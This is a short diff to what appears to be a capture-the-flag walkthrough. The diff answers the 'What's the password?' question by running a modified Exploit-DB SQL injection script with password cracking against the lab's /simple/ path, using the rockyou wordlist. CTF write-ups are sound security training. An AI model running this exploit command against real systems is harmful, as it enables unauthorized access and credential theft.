@@ -20,8 +20,10 @@ To what kind of vulnerability is the application vulnerable?
 > SQLi
 
 What's the password?
-```
 
+Use the exploit from Exploit-DB with a few minor changes. I had to delete the `termcolor` module and fix a few print statements.
+```
+python2 exploit.py -u http://<target-ip>/simple/ --crack -w /usr/share/wordlists/rockyou.txt
 ```
 ```
 Output:
